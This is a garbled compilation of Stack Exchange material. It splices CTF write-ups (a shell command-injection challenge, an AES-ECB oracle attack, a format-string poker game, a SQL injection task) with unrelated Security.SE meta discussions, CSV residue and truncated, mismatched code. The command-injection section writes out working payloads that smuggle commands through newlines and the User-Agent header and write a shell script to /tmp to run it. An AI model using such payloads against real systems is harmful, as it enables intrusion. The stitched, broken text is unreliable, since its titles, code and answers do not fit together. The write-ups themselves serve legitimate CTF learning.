<p>As we saw in smartcat1, <a href=""http://smartcat.insomnihack.ch/cgi-bin/index.cgi"" rel=""nofollow noreferrer"">http://smartcat.insomnihack.ch/cgi-bin/index.cgi</a> lets us submit a string which is executed as a shell command, prefixed by <code>ping -c 1</code> (with a space at the end). The string we can inject can't contain horizontal spaces or any of <code>$;&amp;|({`</code> but can contain newlines. We're told that this time the flag is in <code>/home/smartcat</code>. We can get the command's output on stdout, but not its output on stderr. We only get the command's output if it succeeds, but that's easily arranged by adding <code>true</code> as the last command.</p>

<p>Let's explore the <code>/home/smartcat</code> directory.</p>

<pre><code>wget -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi --post-data=$'dest=127.0.0.1\nHOME=/home/smartcat\ncd\nls'
</code></pre>

<p>There are two files, <code>flag2</code> and <code>readflag</code>. Unfortunately neither <code>cat&lt;flag2</code> nor <code>./readflag&lt;flag2</code> succeed. But we can read <code>readflag</code> (it's a binary so I use base64 to make it easy to go through layers of escaping):</p>

<pre><code>wget -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi --post-data=$'dest=127.0.0.1\nHOME=/home/smartcat\ncd\nbase64&lt;readflag'
</code></pre>

<p>There are intersting strings in that program:</p>

<pre><code>Almost there... just trying to make sure you can execute arbitrary commands....
Write 'Give me a...' on my stdin, wait 2 seconds, and then write '... flag!'.
Do not include the quotes. Each part is a different line.
</code></pre>

<p>So how can we execute arbitrary code? Pipes are forbidden but not redirection, so we can use <code>sh&lt;/path/to/file</code>, if we're able to get arbitrary shell code into a file. A bit of experimenting shows that we can read and write files in <code>/tmp</code>. How do we get the desired file content, without using any command that takes a command line argument? The <code>env</code> command! It lets us write arbitrary code into a file by defining an environment variable whose value contains newline; the code is in the middle of some garbage doesn't prevent running the script. And we can inject an environment variable: <code>HTTP_USER_AGENT</code>.</p>

<pre><code>wget -U $'ignored; { echo Give me a...; sleep 2; echo ... flag\!; } | /home/smartcat/readflag' \
     -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi \
     --post-data=$'dest=127.0.0.1\nenv&gt;/tmp/D25Tm1Tx.sh\nsh&lt;/tmp/D25Tm1Tx.sh\ntrue'`
</code></pre>

<h1>Bring the noise</h1>

<p>Step 1: we get a challenge consisting of 5 random hex digits. We need to reply with a string string whose MD5 in hex starts with those 5 digits.</p>



<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tomcrypt.h&gt;

                    calculate_md5(md5, (unsigned char*)response, 4);
                    if (md5[0] == challenge &gt;&gt; 12 &amp;&amp;
                        md5[1] == (challenge &gt;&gt; 4 &amp; 0xff) &amp;&amp;
                        (md5[2] &gt;&gt; 4) == (challenge &amp; 0xf)) {
                        return;
                    }
                }
            }
        }
    }

int main()
{
    unsigned md5_challenge;
    char md5_response[10];

    }
    search_md5(md5_challenge, md5_response);
    puts(md5_response);
    return 0;

<p>Step 2 uses the following Python function:</p>



<pre><code>def learn_with_vibrations():
    q, n, eqs = 8, 6, 40
    solution = [randint(q) for i in range(n)]
    equations = []
    for i in range(eqs):
        coefs = [randint(q) for i in range(n)]
        result = sum([solution[i]*coefs[i] for i in range(n)]) % q
        vibration = randint(3) - 1
        result = (result + q + vibration) % q
        equations.append('%s, %d' % (str(coefs)[1:-1], result))
    return equations, solution
</code></pre>

<p><code>solution</code> is a list of 6 random integers in the range 0–7. We get 40 equations of the form <code>sum(c[i] * solution[i]) = r</code> where <code>r</code> is the result of the summation mod 8 with a random “vibration” that can cause a difference of -1, 0 or +1. We need to find the solution. There are only 2<sup>20</sup> potential solutions so we can just try them all by brute force.</p>

<h1>Fridginator 10k</h1>

<p>Searching for food redirects to an interesting-looking URL, e.g. <code>/search/67d4b8f78c33d07cbdc7293b9cd93b8f37231e5001982893f5c3a6494d14bbba/</code> for an empty query string. A bit of experimentation shows that the hex string consists of a variable number of 16-byte blocks (represented as 32 hex digits each), and changing one byte of the query leads to changing one block:</p>

<pre><code>query length    blocks  last block constant
0-9             2       yes
9-12            2       no
13-25           3       yes
26-28           3       no
29-41           4       yes
42-44           4       no
</code></pre>

<p>I started with the following shell script. Later I used the <code>show</code> command of the Python script below.</p>



<pre><code>#!/bin/bash
# TODO: escape special characters properly
for x do
  curl -s -b cookies.txt -D - http://fridge.insomnihack.ch/food/ \
       -d 'csrfmiddlewaretoken=0j12lGgcA3nXrbXfK5FOaeRUUZZlN56w&amp;submit=Search&amp;term='""$x"" |
  sed -n -e ""s~^Location: /search/~~"" -e T -e ""s~/\\r\$~ $x~"" -e p
done
</code></pre>

<p>If we repeat a 16-byte string in the query, except for the first few and first last bytes, we get a repeated block. This very strongly suggests that those bytes are the result of encrypting a string containing the query with AES-ECB, i.e. the plaintext is <code>prefix + query + suffix</code>. On a 10-byte query for food, changing any of the first 9 bytes affects the first output block, while changing the 10th affects the second block, so the constant prefix must be 7 bytes long. The length of the suffix depends on the padding mode; assuming PKCS#7 padding, where the padding is 1–16 bytes, the suffix is 12 bytes long. The search for users is similar, with the same prefix but a different suffix of length 10.</p>

<p>If we arrange for the suffix to be aligned so that its only last byte is in the last block, there are only 256 possible plaintexts for that last block. Given that the encryption of a block in ECB depends only on its plaintext, we can try all possible 256 blocks consisting of one byte plus its PKCS#7 padding. One of these blocks will match the last block, telling us what the last byte is. Then we can repeat the query with the last two bytes of the suffix in the last block, using the known last byte and varying the next-to-last byte, and so on until we have the whole suffix. The command <code>find_suffixes</code> of the Python script below does this job. The suffix turns out to be <code>|type=object</code> for food and <code>|type=user</code> for users.</p>

<p>This technique won't work to find the prefix. But we can verify guesses by submitting a query like <code>aaaaaaaaa1234567aaaaaaaaa</code> where <code>1234567</code>. The prefix turns out to be my first guess: <code>search=</code>.</p>

<p>In a last exploit of ECB, we can now find the ciphertext for an arbitrary search operation. Just find the relocation URL for <code>aaaaaaaaa + pkcs7_pad(string) + sss</code> and discard the first and last blocks. This enables us to craft queries that don't match the expected format, which will hopefully prove useful. The Python script below packs that into the <code>search</code> command.</p>

<pre><code>$ ./search.py search ""search=|type=bobby'tables""
…
    &lt;div class=""panel-body""&gt;
     Something went horribly wrong, what are you doing to me??

Why is stackoverflow not using captcha?,"<p>Yes, it is vulnerable. Anyone can grab your session cookie.</p>

<p>Why? Ignorance and denial as far as I can tell. Very slowly StackExchange developers have been moving towards enabling https, but after a short spurt of development it seems to have stopped again. I still don't use this site on higher-than-average risk networks (public wifi; security conferences), or I turn on VPN first if I really want to use this site. StackExchange is the only site I frequent that does not support https.</p>

<p>If you type https in the address bar manually, it seems to accept that now. I hadn't noticed this yet, in the past it'd redirect you back to insecure http unless you were on the login page, and right now it still has mixed content issues. Ugh. It really isn't that difficult.</p>

<p>Typing https manually works if you're logged in (if not, after logging in it will kick you back to http so there goes your session, no matter what you do), but the DNS lookups reveal which site you're using and someone could easily inject a request in your browser (when you use, say, a news website over plain http) to the insecure version to grab your session cookie.</p>

<p>TL;DR: ignorance from the developers regarding session cookies over http. I guess they're waiting for a high-profile case to happen. I've had this happen around 2009 on a different site to my admin account, so that was the lesson for me.</p>

<p>My observations are that the counter now takes into account all review queues from everybody, and pop-ups only when a certain threshold (most probably defined on a per-site basis, each site having different loads, the threshold appearing to be currently set to 3 reviews on Security SE), leading to these notable effects:</p>

<li>While the user is below 2K, there is no such indicator (even though starting from 500 a user already has access to a few review queues). At this stage the new user user should focus on understanding how SE works and what defines a good post on the current site.</li>

Remove the `professional-education` tag,"<p>The clean way to delete links from spam is to ensure that the spam post gets deleted as soon as possible. To do this, <strong>flag as spam</strong>. Six spam flags (or a single one from a moderator) delete the post, lock it in this deleted state, and teach the Stack Exchange spam filter to reject posts with similar characteristics¹. Do not downvote in addition² — that can draw reviewers' attention away from the post, and thus delay its removal.</p>

<p>Once a spam post is deleted, it will no longer show up anywhere. Even users who can see deleted posts³ only see an indication that there is a spam flag and need to click through a link to see the post's content.</p>

<p><strong>Never edit links out of a spam post</strong>. This makes the spam less recognizable and opens a chance that subsequent reviewers will consider the post ham.</p>

<p>You can't have your cake and eat it. Until the post is officially deemed to be spam, it must be recognized as spam. If you were to turn it into ham, it would no longer be spam and thus no longer on the fast track to deletion with extreme prejudice.</p>

",<discussion><question-quality>,26,,1412
Why do people post questions on here they can easily google an answer for?,"<p>Google-searching is a rarefying skill. It seems to be a question of generation. Let me put some historical context.</p>

<p>In days of my youth (say, 25 years ago, in the late 1980s and early 1990s), when you wanted to learn about something, you went to the public library and looked it up in an encyclopaedia. You also scanned the books on display to see if there was one about your research subject. If you wanted more data you had to invest time and money to order specialized books in a bookshop. All this learning was very active.</p>

<p>Then, from the mid-1990s onward, the Web began to grow and accumulate data, and search engines appeared (remember Altavista ?). People who were used to the library-searching began to use search engines in about the same way: to locate and pinpoint sought-after information.</p>

<p>In the early 2000s (2001, to be precise), Wikipedia appeared and the searching process began to change. The aggregation of information in Wikipedia meant that it became a relatively natural entry point. If you wanted to learn about a subject, you began by reading the Wikipedia article, and possibly followed some of the internal and external links; there is little googling involved in such a process. This also forced search engines to somehow change their stance: while in 1995 you wanted to learn who was the 6th emperor of the Qing dynasty(*), in 2005 you go to Google to know when the nearest restaurant opens. This is still information, but not the same usage context.</p>

<p>Then social networks appeared. They completely reversed the way people use the Internet. This is especially apparent in young people (say, 20 years old or less), who spend inordinate amounts of time connected to Facebook and its ilk. They use the Internet not by going forth and exploring the information jungle with the help of search engines or even Wikipedia; they simple <em>receive</em> a lot of the stuff from their extended network of relations. A youth who grew up to the Internet through social networks has hundreds of Internet-friends, and has barely enough time to simply sift through all the data that they push unto him. For him, Google-searching is an almost alien concept. When he really wants to learn about a specific subject, he asks: he pushes a message so that his Internet-friends, not an anonymous robot like Google, gives him the answer.</p>

<p>Different site, same people: when social network users come to StackExchange, they keep their Internet usage habits: they don't look things up in Google; they ask. Many do not even look up <em>other questions</em> in StackExchange, which is why there are many duplicates.</p>

<p>The amazing thing is how fast this transformation occurred: in two decades, search engines transitioned from ""bleeding edge technology"" to ""tool for dinosaurs"".</p>

<p>(Of course I am talking generalities here; there are still people who use search engines, and even people who go to public libraries. And there are good reasons to ask questions as well. But my point is that the googling reflex is not as widespread as it used to be.)</p>

<p>I also like the content of your FAQ blurb, but would lower the language to make it a bit more accessible. Maybe something like:</p>

<blockquote>
  <p>Security is always relative, and depends on the context. A question asking whether or not something ""is secure"" is very hard to answer unless the question includes details about 1) the system or process you are trying to secure 2) the kind of attacker you are trying to protect against.

"Should I report a fake user account that was just created? If so, how?","<p>I agree that those kinds of questions are not good, and anything to help guide posters is helpful.

<blockquote>
  <p><strong>What background should I give in my question?</strong> Security is a very contextual topic: threats that are deemed important in your environment may be inconsequential in somebody else's, and vice versa. Are you trying to protect something of global value against Advanced Persistent Threats? Or are you looking for a cost-effective approach for a low-profile small business?

  <ul>
  <li>what assets you are trying to protect</li>
  <li>who uses the asset you're trying to protect, and who you think might want to abuse it (and why)</li>
  <li>what steps you've already taken to protect that asset</li>
  <li>what risks you think you still need to mitigate</li>

<p>This issue was a question in the 2015 moderator election Q&amp;A: </p>

<blockquote>
  <p>One challenge that Sec.SE experiences is that of repetitive questions
  for which there could be a canonical answer, but for which there often
  is no single canonical answer posted. Can you suggest a way for us to
  improve canonical reference handling of FAQs? The primary example
  might be new users posting obfuscated PHP code that they found in
  their Wordpress - there are a handful of good answers in the past, all
  narrowly focused on the code presented within the question that they
  answered, but rarely describing the principles and tools of
  de-obfuscation that would make for a useful canonical answer. New
  questions rarely receive solid canonical efforts because posters know
  that there are already many answers out there; old excellent answers
  get lost in the shuffle among so many of the same type of questions.
  People are going to keep coming with this question, and others like it
  - we can't pre-educate newcomers all that well. How can we handle it to both meet their needs and lower the repetitive investment of ""good
  enough here and now"" answers?</p>
</blockquote>

<p>Just before the election, we were getting a lot of code snippets being submitted, and the general response from the community was to close as off-topic, but it was an open question (hence an election topic).</p>

<p>You are correct in bringing this to the fore. Let's come to a decision.  </p>

<p>My understanding is that questions need to have some relevance outside the single person asking. Unless there is a way to do that, individual code snippets are off-topic. </p>

Let's get rid of [scripting] manually,"<p>Googeling is easy and quick on subjects you already know a lot about. Googeling is hard on subjects you know little about. Why? Three reasons:</p>
<ol>
<li><strong>What should I google?</strong><br> If you don't know the correct terminology, you will not get the right result.<br>
<em>Example:</em> You want to know how the webpages you visit are encrypted, it might be hard if you don't know you should google HTTPS.</li>
<li><strong>What if I don't understand the answer?</strong><br>
You might end up on a technical page or a documentation way above your level, so you cant understand any of the results. If there only was somewhere you could ask for an explanation and ask follow up questions...<br>
<em>Example:</em> On your quest to understand if the webpages you recieve over the web are encrypted, you end up trying to read the <a href=""https://www.rfc-editor.org/rfc/rfc5246"" rel=""nofollow noreferrer"">TLS standard</a>, without understanding a word.</li>
<li><strong>What results should I trust?</strong><br>
You get loads of results, and they seem to contradict each other. There might not be an actual contradiction, but you don't know enough to tell the difference. Better to ask someone with a nice profile picture and loads of magical internet points - they would never lie to you.
<br><em>Example:</em> One page says that &quot;the web is inherently insecure&quot; and another says &quot;HTTPS makes the web safe&quot;. What is true?</li>

My backside is hurt by migration of question to the legal site,"<p>I hadn't seen your question before this, but I frequently vote to close question on this site as asking for legal, rather than professional information security advice.  Had I seen this question, I would have placed it solidly in this camp.  </p>

<p>Yes, there certainly are areas of overlap, I agree.  But to wit, your question specifically asks about legal responsibility, and references both a previous court case and several laws.   It's hard to see any overlap here at all.  This is a legal question. </p>
",<discussion>,-2,,106
My backside is hurt by migration of question to the legal site,"<p>The question, as currently worded, is most definitely a legal issue. Even if it were not, it falls very close to being close-worthy as ""too broad"" or ""primarily opinion-based"" anyway. So, it's probably better that it got migrated than just shut down.</p>

<p>Here, you have a security incident where a certain amount of impact has been assessed. (In this case, some files being encrypted by unauthorized code running on the system.) It is very possible, perhaps even likely, that the incident's actual impact is greater than what has been assessed - and, depending on the resources available to the assessors, greater than what <em>can</em> be assessed in the absence of a public disclosure from the attackers or their clients. (In this case, the files could possibly have be exfiltrated and the affected organizations may not have the logging/monitoring tools needed to recognize this.)</p>

<p>If you had asked how the security team should react, in terms of recovery &amp; reconstitution, mitigating the vulnerabilities that were exploited to cause the scenario, or restoring the system to a secure state, then it would be closer to on-topic for IT Security. It's still a bit subjective as to whether or not it would be appropriate, in any given situation, to treat the incident as if it had higher impact than what can actually be seen. But at least it would be more on-topic.</p>

<p>Instead, your question is about how the security team is or should be required to report this. And that is very much a legal matter, subject to corporate policies and local laws. You're even specifically citing references to U.S. federal and California state laws. While security experts may often conduct work affected by these, and are frequently even called to testify regarding them, the best people to offer reliable advice on any subject pertaining to law are experienced lawyers. Always. Without exception.</p>

<p>Let's generalize this a bit, to another possible scenario. Instead of having files encrypted, let's say the system just started to suddenly get ads for porn or gambling sites popping up on its screen randomly. There's obviously something unauthorized running on the system, and (absent certain monitoring/logging capabilities) we can't really be sure what else it might be doing.</p>

<p>A question like this might be acceptable here: ""I got infected with some malware that did ABC. Antivirus detected it as XYZ. I think I got it all out, since the bad behavior stopped and I don't see file foobar.exe or any registry entries with bazquxnorf in them anymore. Should I return the system to production, or are there other measures I should take to lock it down and ensure it is clean?"" </p>

<p>It would be a fair bit subjective, and most likely get a bunch of responses like ""nuke from orbit"", ""uninstall Java"", ""upgrade to Linux"", etc. But it would be a bit more on-topic.</p>

<p>However, your question is more like: ""I got infected with some malware that did ABC. I wiped the machine and rebuilt it from a known-good image. Should I report this to legal?""</p>

<p>Even if that didn't get migrated to Law.SE, answers around here would be more like ""it depends on [long list of factors that we don't know the answer to]"", or ""you need to check your company's policy"", etc. So, it would still end up closed here as too broad or primarily opinion-based.</p>

"Sunshine CTF 2016 - 12 March 2016 at 16 pm UTC, lasts 28,5 hours","<p>Here is a solution along with the hows and whys this worked:</p>

<p>Scenario:</p>

<p>We were given a web application with a very simple interface, a background image and a text box allowing for an input.</p>

<p>The web application was a JavaScript front end which connected to a python flask application on the backend over a web socket. This python backend then connected to a database to upload our answers and also retrieve a single entry from the database.</p>

<p>What we learnt from examining the code:</p>

<ol>
<li>The replies and requests were made over socket as a json array</li>
<li>The data was handled and escaped by a self implemented function</li>
<li>The database was MySQL</li>
<li>The statements are being loosely prepared (string being created and variables added after)</li>
<li>The encoding for the back end script with shift_jis</li>
</ol>

<p>What does this tell us?</p>

<p>This tells us that we will not be able to use an overly simplistic injection attack (using special characters such as "" / ' and so on).</p>

<pre><code>MYSQL_SPECIAL_CHARS = [ 
(""\\"", ""\\\\""), 
(""\0"", ""\\0""),

Merge tags [vulnerability] and [vulnerabilities]?,"<p>Here is a solution along with the hows and whys this worked:</p>

<p>Scenario:</p>

<p>We were given a web application with a very simple interface, a background image and a text box allowing for an input.</p>

<p>The web application was a JavaScript front end which connected to a python flask application on the backend over a web socket. This python backend then connected to a database to upload our answers and also retrieve a single entry from the database.</p>

<p>What we learnt from examining the code:</p>

<ol>
<li>The replies and requests were made over socket as a json array</li>
<li>The data was handled and escaped by a self implemented function</li>
<li>The database was MySQL</li>
<li>The statements are being loosely prepared (string being created and variables added after)</li>
<li>The encoding for the back end script with shift_jis</li>
</ol>

<p>What does this tell us?</p>

<p>This tells us that we will not be able to use an overly simplistic injection attack (using special characters such as "" / ' and so on).</p>

<pre><code>MYSQL_SPECIAL_CHARS = [ 
(""\\"", ""\\\\""), 
(""\0"", ""\\0""), 
(""\n"", ""\\n""), 
(""\r"", ""\\r""), 
(""'"", ""\\'""), 
('""', '\\""'),

Can I gather community opinions of a specific information security practice?,"<p>I think there are many qualitative differences between your Splikity question and the referenced Telegram question.</p>

<p>Before going into specifics, let's keep in mind the tooltip that is displayed when you mouse over the down arrow for a question in the web app:</p>

<blockquote>
  <p>This question does not show any research effort; it is unclear or not useful</p>
</blockquote>

<p>When I look at your question, the first thing I notice is that you reference a relatively unknown service and don't provide any links. That means that everyone who is to respond will need to do a search themselves. Compare this to the Telegram question that is full of links to the products main sites as well as to specific documentation links. I feel this both shows strong research on the Telegram OP's part, as well as makes the Telegram posting more useful to future viewers.</p>

<p>Your question of ""Is Splikity actually secure?"" turns out to be really hard to answer. If you look through the main site, you'll see tons of comments asking questions like ""Secure for what?"" and ""What is your threat model?"" We just don't know how to evaluate such a question. On the other hand, the Telegram question asks ""Is Telegram more secure than WhatsApp?"". So the possible answers are ""Yes"", ""No"", and ""Telegram is more secure in terms of A, B, C while WhatsApp is more secure in terms of X, Y, Z."" IMO, that makes it a clear question.</p>

<p>Note that I do not think that the number of votes on the two questions is an indication of their relative quality. That's largely due to the popularity of the WhatsApp app (the WhatsApp question has nearly 1000 times more views than the Splikity one) as well as details about how StackExchange sites work (eg: @tim's guess about it becoming a ""hot"" question).</p>

<p>I used <a href=""https://retdec.com/decompilation/"" rel=""nofollow noreferrer"">retdec</a> to get some juicy info about the source:</p>



<pre><code>int main(int argc, char ** argv) {
    char * mem = malloc(46); // 0x80485ae
    int32_t v1 = (int32_t)mem; // 0x80485bc
    strcpy(mem, ""Welcome to Randy's TinyPoker! DebugInfo: AAAA\n"");
    srand(time(NULL));
    uint32_t v2 = rand(); // 0x80485f6
    char * v3 = (char *)(v1 + 41); // 0x8048601_0
    *v3 = (char)((int32_t)*v3 + v2 / 0x1000000);
    char * v4 = (char *)(v1 + 42); // 0x804861e_0
    *v4 = (char)((int32_t)*v4 + v2 / 0x10000);
    char * v5 = (char *)(v1 + 43); // 0x804863b_0
    *v5 = (char)((int32_t)*v5 + v2 / 256);
    char * v6 = (char *)(v1 + 44); // 0x8048658_0
    *v6 = (char)((int32_t)*v6 + v2);
    printf(mem);
    printf(""We've dealt you your hand face down, please enter it:\n"");
    int32_t str;
    memset((char *)&amp;str, 0, 5);
    int32_t stream = g1;
    fgets((char *)&amp;str, 5, (struct struct__IO_FILE *)&amp;stream);
    if (str == v2) {
        printf(""You guessed that hand perfectly! Here's your prize: flag-here\n"");
    } else {
        printf(""Sorry, wrong hand, try again!\n"");
    }
    return 0;
}
</code></pre>

<p>So basically <code>v1</code> points to a string in memory <code>Welcome to Randy's TinyPoker! DebugInfo: AAAA\n</code>, <code>v2</code> is some random number and <code>v3</code>, <code>v4</code>, <code>v5</code>, <code>v6</code> all point to the debug info part (AAAA initially).</p>

<p>Then it proceeds to add a <em>part</em> of the random number to each of <code>v3</code>, <code>v4</code>, <code>v5</code>, <code>v6</code> by dividing v2 first:</p>

<pre><code>*v3 = (char)((int32_t)*v3 + v2 / 0x1000000); // v3 = v3 + (v2 / 2^24)
*v4 = (char)((int32_t)*v4 + v2 / 0x10000);   // v4 = v4 + (v4 / 2^16) 
*v5 = (char)((int32_t)*v5 + v2 / 256);       // v5 = v5 + (v5 / 2^8)
*v6 = (char)((int32_t)*v6 + v2);
</code></pre>

<p>At the end, it compares our input with the random generated value <code>str == v2</code>. So in order to guess correctly we need to get the debug info and substract <code>A</code> from each character, pack it and send it!</p>



<pre><code>#!/usr/bin/python3

# Make sure to install pexpect (linux only) - pip install pexpect

Are code obfuscation techniques off topic on this site?,"<p>That answer is not incorrect, but it is incomplete. As you noticed there is a serious design flaw in the implementation described in the question. The question does not explicitly ask about this weakness, and the answer does not mention it.</p>

<p>Though technically a correct answer to the question as it was asked, it is indeed a disservice to provide the answer as such without pointing out the quite severe weakness.</p>

Are code obfuscation techniques off topic on this site?,"<p><strong>Meme:</strong> They can see your dick pics.</p>

<p><strong>Originator:</strong> John Oliver (<em>Last Week Tonight</em>, on HBO)</p>

<p><strong>Cultural Height:</strong> 2015-2016</p>

<p><strong>Background:</strong> In June of 2013, documents stolen from the <a href=""https://en.wikipedia.org/wiki/Nsa"" rel=""nofollow noreferrer"">NSA</a> by <a href=""https://en.wikipedia.org/wiki/Edward_snowden"" rel=""nofollow noreferrer"">Edward Snowden</a> were released to the public. These documents revealed to the layman extensive government surveillance systems which previously were assumed to not actually exist. (Conspiracy theorists have long warned of such systems. While the rest of the general public likely assumed government agencies were capable of designing and employing them, they perhaps equally assumed this had not actually been done or was not being done indiscriminately.)</p>

<p>In April of 2015, laws which enabled the use of these systems were nearly due to be renewed. However, public interest in the topic had largely waned at this point. In an informal survey, <a href=""https://en.wikipedia.org/wiki/John_Oliver_(comedian)"" rel=""nofollow noreferrer"">John Oliver</a> - host of <a href=""https://en.wikipedia.org/wiki/Last_Week_Tonight_with_John_Oliver"" rel=""nofollow noreferrer""><em>Last Week Tonight</em></a>, a news satire show airing on <a href=""https://en.wikipedia.org/wiki/HBO"" rel=""nofollow noreferrer"">HBO</a> - found that nobody could even properly recall who Edward Snowden was.</p>

<p>In order to re-ignite the discussion, and inspire the public to action, it was necessary to find an aspect of the government surveillance programs which the layman could intimately relate to. So, in the same survey, respondents were asked how they would feel if the government had obtained access to pictures of their genitalia - i.e.: ""dick pics"". Of course, the situation was found to be generally undesirable by all.</p>

<p>To bring this into relevance with the discussion of government surveillance, John Oliver traveled to Russia for an interview with Edward Snowden. During the interview, he shared his survey results with Snowden. Then, Oliver proceeded to ask Snowden about the various government surveillance programs which had been brought to light by his leaks. Regarding each, Oliver asked ""Can they see my dick?"".</p>

<p>The full segment is available on <a href=""https://www.youtube.com/watch?v=XEVlyP4_11M&amp;feature=youtu.be&amp;t=24m46s"" rel=""nofollow noreferrer"">YouTube</a>, courtesy of HBO. (Link jumps to the portion where ""dick pics"" are brought into scope.)</p>

<p>This is a fantastic example of how matters of information security can be brought into focus and made relevant to an otherwise ignorant or unconcerned audience. In this case, it was for the general public. However, information security professionals often face similar challenges when having conversations with members of management - especially at higher levels, and with C-level executives.</p>

<p>So, when addressing the level of exposure posed by a certain risk, it may help to ask (or answer) the question: ""Can they see the dick pics?""</p>

"If a user (me) has a fundamental misunderstanding, shouldn't it be corrected?","<p>In some cases, I would say yes, a misunderstanding should be corrected by an answer.  In the case of fundamental misunderstandings, or false assumptions that form the basis of a question, we certainly have users who feel that this is automatic grounds for closure, and although I don't know that I 100% agree with that in many cases, it's probably generally appropriate.  </p>

<p>In the case of the your specific question, I would say that the appropriate course of action was taken.   Because of your misunderstanding, it's hard to really know what the question is at all, and I suspect that underneath the covers it will not turn out to be an information security question, but a basic networking question, which would be off-topic for this site in any case.  </p>

<p>So, while I agree with you that there are cases where questions in which the poster does not understand how something works should indeed be corrected by an answer, I would suggest that is only the case when the question is clear, clearly on-topic for the site, and not overly broad.  </p>

<p>Depending on the answer it is also useful to leave the original in tact, add a title and put the new/improved answer above with its own title and date. This way people can see the old way and the new way. And possibly explain what changed to produce the new answer. We have seen a few great answers that have had multiple edits over the years this way and find them far more complete than a rewrite. On rare occasion the old answer might still fit someone's needs, so it's good to have both.*</p>

<p>This model was highlighted during the <a href=""https://meta.stackoverflow.com/questions/289032/whats-stackegg"">game</a> that StackExchange ran for each site.

<p>Over here on Sec.SE, because there is way less traffic, the problem is not as maddening as on SO, but still a problem we as a community should try and take care of.</p>
<p>In fact, on SO <a href=""//stackoverflow.com/teams/11/socvr"">there is a &quot;SOCVR&quot; team</a> in an attempt to rather improve the question and be helpful to new users, trying to educate them as to how they may get better answers faster.</p>

<li><p>leave useful comments when downvoting and/or closevoting (as does schroeder regularly, there is a user script for auto-comments, which makes that easier for recurring problems),</p>
</li>
<li><p>have a <a href=""https://chat.stackexchange.com/rooms/37754/sec-se-cvr"">chat room</a> with experienced users who try to explain the problems with questions to OPs in a more direct way, helping to shape the questions in form.</p>

<blockquote>
<ul>
<li>Work with the OP to get their post into shape; most content has some value.</li>
<li>De-escalate in case of disagreement.</li>
<li>A post is to be actively handled by only one member of the room. (We don't need 4 members all leaving witty statements in the comments or in chat.)</li>
<li>Moderate the post, not the user. (keep the discussion on the merits of the post, not on behavior of the user)</li>

<p><strong>What to do?</strong></p>

<p>If you just want to quickly inform the user of a possible solution, post it as a comment. It's not strictly forbidden, it doesn't really do any harm, and if someone really minds, they can still flag it.</p>

<p>If you want to post it as an answer, it has to be an actual answer by you (so just copy-pasting from the link would also not be ok). You could summarize the linked content, eg: </p>

<p>I see no problem with this here on InfoSec.SE. Nor any reason to close the question. On this site, ""expert opinions"" are ok and actually quite valuable to the community. An analysis of how an attack <em>might</em> have been executed helps our users (who are often system admins) to become aware of vulnerabilities, think like an attacker, and reduce their own attack surfaces.</p>

<p>Whenever we see a question like ""How did high-profile breach X happen?"" answerers often chose instead to focus on the implied question of ""...and how do I protect myself from a similar fate?"". I think there's tremendous value in that.</p>

<p>One could fix the down-voting algorithm so that the impact to new user's reputations causes less variance in their reputations.

Basically, you have an answer which is technically valid, informative, and fully honest in its disclosure of conflict of interests; and yet, it comes from an author with which ""we"" (the so-called SE community) would not like to be associated. It kinda forces us to make a clear decision.</p>

<p>I <em>suppose</em> that if that answer came to appear before the eyes of a journalist who is out of news fodder, or the chaste eyes of a SE moderator (not a community-elected moderator), then thorough smiting may occur.

Should we allow malware authors to weigh in on questions?,"<p>Ok, so let me clarify my stance on this one. The answer is two fold:</p>

<blockquote>
  <p>The best thing to do is nothing. Doing something stupid might lead to data loss or corruption. </p>
</blockquote>

<p>This part, I am totally fine with. It's a valid stance and is worth discussing regarding restoration of data if the process can be reversed.</p>

<p>Then comes the second part: </p>

<blockquote>
  <p>Let it finish and then contact the people listed there, pay the ransom and you are good to go. We are professionals and will help you get your files back.
  Disclaimer: I am a ransomware developer.</p>
</blockquote>

<p>This part is potentially harmful as malware owners will most probably:</p>

<ul>
<li>get a copy of your data in the process</li>
<li>get your money and not give you your files back </li>
</ul>

<p>Both of these being harmful to the user, even if he is honest with his business. Not calling out the potential risk while kind of advertising for the service is detrimental to someone looking for answer for this particular problem, especially if it's ongoing.</p>

<p>The disclaimer is error prone at best, malevolent at worst. It is not really possible to know whether the author claims that malware authors like him are professionals that will help you get your data back, or if he is posing as a security expert, knowing about malware, that will help you recover your data the right way. I'm not yet sure which understanding is intended.</p>

<p>Disclosure doesn't necessarily make every conflict of interest acceptable. If somebody posts, ""how do I do X"" and somebody answers, ""just buy product Y, disclaimer: I am author of product Y,"" then we would not accept that as a valid answer.</p>

<p>Furthermore, other posters in this thread are talking about this disclosure like its some altruistic attempt at transparency. You really think a criminal cares about the SE rules? My guess is that he discloses his affiliation because it's the only way to support his answer.

"Should book recommendations be excluded from the ""no product recommendations"" rule","<p>It seems to me that there is quite a bit of time wasted on the assumption that people on here (whitehat, blackhat, grey, yellow...) are actually telling the truth about who they are. Honestly, when I read a question I skim over personal details and all the 'fluff' just to figure out what the actual question or answer is -from an objective perspective. </p>

<p>In fact, I many times edit posts to <em>remove</em> that fluff just so they can be received equally and not judged on some ancillary detail (Like ""my mother is..."" or "" I am a ransomeware author..."") that doesnt add value to the post itself.</p>

<p>While this debate over the stance is useful from a philosophical perspective, it is moot in that we cannot reasonably determine if posters are who they say they are. That being the case, why bother getting all flustered about it. Just take posts at face value.</p>

<p>My suggestion would be to (1) add verbage in the policies that encourage objectivity in posting, (2) actively edit posts to remove subjective details -especially credentials that cannot be verified, and (3) encourage users to be tolerant of offensive posts.</p>

Too quick on close-hammer'ing,"<p>I think we should weigh all pros and cons. Speaking about Ransomware is actually like suggesting to enter personal data on a phishing site. </p>

<p>Assume I have never heard of Ransomware. If a pop-up shows up asking to pay to retrieve my data, I will probably not pay. </p>

<p>However, if the pop-up shows the message ""You have been caught by Ransomware"" and I previously know what Ransomware is, there's a slight chance I will pay (eventually using a throwaway credit card) if the asked money is not so much and I don't want to reinstall everything on my machine.</p>

<p>Questions and answers on Ransomware helps Ransomware builds a reputation, which turns in money for Ransomware developers. Isn't strange already the burst of traffic on that question? I've also had some discussion in comments which was extended into a chat discussion about that.</p>

<p>However that question is invaluable because it makes present that encrypting data may eventually cause the loss of the data (bugged crypto routine, or simply a 1 bit error: if you have a  1 bit error somewhere in your source code it will just turn into a compiler error, which is easy to fix, however 1 bit error in encrypted data turns into a permanent loss of all data).</p>

